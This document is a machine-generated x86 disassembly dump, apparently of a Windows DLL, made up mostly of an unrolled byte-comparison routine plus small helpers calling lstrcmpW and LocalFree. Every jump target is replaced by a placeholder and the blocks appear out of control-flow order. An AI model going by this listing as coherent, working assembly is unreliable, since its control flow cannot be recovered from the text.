cmp [ ebp - 0x28 ] 0x0
je r-xdata
mov [ edi ] ebx
jmp r-xdata
fld [ ecx + 0x10 ]
fstp [ ebp - 0x24 ]
fld [ ecx + 0x10 ]
fldz
fld st0
fucomp st2
fnstsw ax
fstp st1
test ah 0x44
jpe r-xdata
fstp [ ebp - 0x24 ]
call sub_10012991
mov [ eax ] 0x22
jmp r-xdata
fchs
jmp r-xdata
fld [ ebp - 0x24 ]
mov eax [ ebp - 0x2c ]
and [ eax + 0x70 ] 0xfffffffd
fstp st0
sub_100593e0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
pop ebp
retn
nop
mov eax ecx
mov ecx [ eax + 0x8 ]
cmp [ ecx + 0x15 ] 0x0
je r-xdata
sub_10059400
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
push edi
mov edi [ eax ]
test edi edi
jne r-xdata
push ebx
mov ebx [ lstrcmpW@IAT ]
mov [ ebp - 0x4 ] 0x0
push esi
lea eax [ edi + 0x1 ]
pop edi
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] edi
mov edi [ edi + 0x4 ]
test edi edi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] esi
mov [ eax + 0x4 ] esi
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ edi ]
mov ecx [ ecx + 0x4 ]
mov edx [ eax + 0x4 ]
mov esi [ edi + 0x4 ]
push ecx
push edx
call ebx
test eax eax
je r-xdata
pop esi
pop ebx
lea eax [ edi + 0x2 ]
pop edi
mov esp ebp
pop ebp
retn 0x8
push edi
call [ LocalFree@IAT ]
pop esi
pop ebx
xor eax eax
pop edi
mov esp ebp
pop ebp
retn 0x8
call sub_10020880
mov esi [ edi ]
test esi esi
je r-xdata
sub_10059481
mov edi edi
push ebp
mov ebp esp
mov al [ ebp + 0x8 ]
test al 0x20
je r-xdata
test al 0x8
je r-xdata
push 0x5
jmp r-xdata
test al 0x4
je r-xdata
xor eax eax
inc eax
pop ebp
retn
pop eax
pop ebp
retn
test al 0x1
je r-xdata
push 0x2
jmp r-xdata
movzx eax al
and eax 0x2
add eax eax
pop ebp
retn
push 0x3
sub_100594b5
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x10 ]
mov eax edi
sub eax 0x0
je r-xdata
xor eax eax
dec eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
movzx eax [ eax ]
movzx ecx [ ecx ]
jmp r-xdata
dec eax
je r-xdata
sub eax ecx
je r-xdata
mov ecx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
movzx eax [ ecx ]
movzx edx [ esi ]
sub eax edx
je r-xdata
dec eax
je r-xdata
pop edi
pop esi
pop ebp
retn
xor ecx ecx
test eax eax
setg cl
lea eax [ ecx + ecx - 0x1 ]
jmp r-xdata
movzx eax [ ecx + 0x1 ]
movzx ecx [ esi + 0x1 ]
jmp r-xdata
xor edx edx
test eax eax
setg dl
lea eax [ edx + edx - 0x1 ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
movzx eax [ ecx ]
movzx edx [ esi ]
sub eax edx
je r-xdata
dec eax
je r-xdata
movzx eax [ ecx + 0x1 ]
movzx edx [ esi + 0x1 ]
sub eax edx
je r-xdata
xor edx edx
test eax eax
setg dl
lea eax [ edx + edx - 0x1 ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
movzx eax [ ecx ]
movzx edx [ esi ]
sub eax edx
je r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
push ebx
push 0x20
pop edx
jmp r-xdata
movzx eax [ ecx + 0x2 ]
movzx ecx [ esi + 0x2 ]
jmp r-xdata
xor edx edx
test eax eax
setg dl
lea eax [ edx + edx - 0x1 ]
test eax eax
jne r-xdata
movzx eax [ ecx + 0x1 ]
movzx edx [ esi + 0x1 ]
sub eax edx
je r-xdata
xor edx edx
test eax eax
setg dl
lea eax [ edx + edx - 0x1 ]
test eax eax
jne r-xdata
cmp edi edx
jae r-xdata
movzx eax [ ecx + 0x2 ]
movzx edx [ esi + 0x2 ]
sub eax edx
je r-xdata
xor edx edx
test eax eax
setg dl
lea eax [ edx + edx - 0x1 ]
test eax eax
jne r-xdata
mov esi [ eax ]
cmp esi [ ecx ]
je r-xdata
add eax edi
add ecx edi
cmp edi 0x1f
ja r-xdata
movzx eax [ ecx + 0x3 ]
movzx ecx [ esi + 0x3 ]
xor edx edx
test eax eax
setg dl
lea eax [ edx + edx - 0x1 ]
test eax eax
jne r-xdata
xor esi esi
movzx esi [ eax ]
movzx ebx [ ecx ]
sub esi ebx
je r-xdata
xor eax eax
jmp [ edi * 4 + jump_table_1005a989 ]
mov eax esi
jmp r-xdata
mov esi [ eax + 0x4 ]
cmp esi [ ecx + 0x4 ]
je r-xdata
movzx esi [ eax + 0x1 ]
movzx ebx [ ecx + 0x1 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
mov edx [ eax - 0x1c ]
cmp edx [ ecx - 0x1c ]
je r-xdata
mov edx [ eax - 0x18 ]
cmp edx [ ecx - 0x18 ]
je r-xdata
mov edx [ eax - 0x14 ]
cmp edx [ ecx - 0x14 ]
je r-xdata
mov edx [ eax - 0x10 ]
cmp edx [ ecx - 0x10 ]
je r-xdata
mov edx [ eax - 0xc ]
cmp edx [ ecx - 0xc ]
je r-xdata
mov edx [ eax - 0x8 ]
cmp edx [ ecx - 0x8 ]
je r-xdata
mov edx [ eax - 0x4 ]
cmp edx [ ecx - 0x4 ]
je r-xdata
mov edx [ eax - 0x1d ]
cmp edx [ ecx - 0x1d ]
je r-xdata
mov edx [ eax - 0x19 ]
cmp edx [ ecx - 0x19 ]
je r-xdata
mov edx [ eax - 0x15 ]
cmp edx [ ecx - 0x15 ]
je r-xdata
mov edx [ eax - 0x11 ]
cmp edx [ ecx - 0x11 ]
je r-xdata
mov edx [ eax - 0xd ]
cmp edx [ ecx - 0xd ]
je r-xdata
mov edx [ eax - 0x9 ]
cmp edx [ ecx - 0x9 ]
je r-xdata
mov edx [ eax - 0x5 ]
cmp edx [ ecx - 0x5 ]
je r-xdata
movzx ecx [ ecx - 0x1 ]
movzx eax [ eax - 0x1 ]
sub eax ecx
je r-xdata
mov edx [ eax - 0x1e ]
cmp edx [ ecx - 0x1e ]
je r-xdata
mov edx [ eax - 0x1a ]
cmp edx [ ecx - 0x1a ]
je r-xdata
mov edx [ eax - 0x16 ]
cmp edx [ ecx - 0x16 ]
je r-xdata
mov edx [ eax - 0x12 ]
cmp edx [ ecx - 0x12 ]
je r-xdata
mov edx [ eax - 0xe ]
cmp edx [ ecx - 0xe ]
je r-xdata
mov edx [ eax - 0xa ]
cmp edx [ ecx - 0xa ]
je r-xdata
mov edx [ eax - 0x6 ]
cmp edx [ ecx - 0x6 ]
je r-xdata
mov dx [ eax - 0x2 ]
cmp dx [ ecx - 0x2 ]
je r-xdata
mov edx [ eax - 0x1f ]
cmp edx [ ecx - 0x1f ]
je r-xdata
mov edx [ eax - 0x1b ]
cmp edx [ ecx - 0x1b ]
je r-xdata
mov edx [ eax - 0x17 ]
cmp edx [ ecx - 0x17 ]
je r-xdata
mov edx [ eax - 0x13 ]
cmp edx [ ecx - 0x13 ]
je r-xdata
mov edx [ eax - 0xf ]
cmp edx [ ecx - 0xf ]
je r-xdata
mov edx [ eax - 0xb ]
cmp edx [ ecx - 0xb ]
je r-xdata
mov edx [ eax - 0x7 ]
cmp edx [ ecx - 0x7 ]
je r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
pop ebx
jmp r-xdata
xor esi esi
movzx esi [ eax + 0x4 ]
movzx ebx [ ecx + 0x4 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x2 ]
movzx ebx [ ecx + 0x2 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0xc ]
movzx esi [ eax - 0xc ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x8 ]
sub esi edx
je r-xdata
xor eax eax
movzx esi dl
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1d ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0x9 ]
movzx esi [ eax - 0x9 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor ecx ecx
test eax eax
setg cl
lea eax [ ecx + ecx - 0x1 ]
jmp r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1e ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0xa ]
movzx esi [ eax - 0xa ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
movzx edx [ ecx - 0x2 ]
movzx esi [ eax - 0x2 ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0x1f ]
movzx esi [ eax - 0x1f ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0xf ]
movzx esi [ eax - 0xf ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
je r-xdata
mov esi [ eax + 0x8 ]
cmp esi [ ecx + 0x8 ]
je r-xdata
movzx esi [ eax + 0x5 ]
movzx ebx [ ecx + 0x5 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0x3 ]
movzx ebx [ ecx + 0x3 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x1b ]
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x17 ]
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x13 ]
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xf ]
movzx edx [ ecx - 0xf ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xb ]
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x7 ]
movzx edx [ ecx - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
jne r-xdata
movzx esi [ eax - 0x1c ]
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x18 ]
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x14 ]
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x10 ]
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xc ]
movzx edx [ ecx - 0xc ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x8 ]
movzx edx [ ecx - 0x8 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x4 ]
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x1d ]
movzx edx [ ecx - 0x1d ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x19 ]
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x15 ]
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x11 ]
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xd ]
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx edx [ ecx - 0x9 ]
movzx esi [ eax - 0x9 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x5 ]
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
jne r-xdata
movzx esi [ eax - 0x1e ]
movzx edx [ ecx - 0x1e ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x1a ]
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x16 ]
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x12 ]
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xe ]
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xa ]
movzx edx [ ecx - 0xa ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x6 ]
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
mov eax edx
jmp r-xdata
xor esi esi
movzx esi [ eax + 0x8 ]
movzx ebx [ ecx + 0x8 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x6 ]
movzx ebx [ ecx + 0x6 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
movzx esi [ eax - 0x1a ]
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x16 ]
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x12 ]
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xe ]
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xa ]
movzx edx [ ecx - 0xa ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x6 ]
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x2 ]
movzx edx [ ecx - 0x2 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
jne r-xdata
mov eax edx
jmp r-xdata
movzx esi [ eax - 0x1b ]
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x17 ]
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x13 ]
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xf ]
movzx edx [ ecx - 0xf ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xb ]
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x7 ]
movzx edx [ ecx - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x1c ]
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x18 ]
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x14 ]
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x10 ]
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xc ]
movzx edx [ ecx - 0xc ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx edx [ ecx - 0x8 ]
movzx esi [ eax - 0x8 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x4 ]
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
jmp r-xdata
movzx esi [ eax - 0x1d ]
movzx edx [ ecx - 0x1d ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x19 ]
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x15 ]
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x11 ]
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xd ]
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x9 ]
movzx edx [ ecx - 0x9 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x5 ]
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
mov esi [ eax + 0xc ]
cmp esi [ ecx + 0xc ]
je r-xdata
movzx esi [ eax + 0x9 ]
movzx ebx [ ecx + 0x9 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0x7 ]
movzx ebx [ ecx + 0x7 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x19 ]
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x15 ]
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x11 ]
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xd ]
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x9 ]
movzx edx [ ecx - 0x9 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x5 ]
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx eax [ eax - 0x1 ]
movzx ecx [ ecx - 0x1 ]
sub eax ecx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
je r-xdata
test eax eax
jne r-xdata
movzx esi [ eax - 0x1a ]
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x16 ]
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x12 ]
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xe ]
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xa ]
movzx edx [ ecx - 0xa ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x6 ]
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x2 ]
movzx edx [ ecx - 0x2 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x1b ]
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x17 ]
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x13 ]
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xf ]
movzx edx [ ecx - 0xf ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xb ]
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx edx [ ecx - 0x7 ]
movzx esi [ eax - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x1c ]
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x18 ]
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x14 ]
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x10 ]
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xc ]
movzx edx [ ecx - 0xc ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
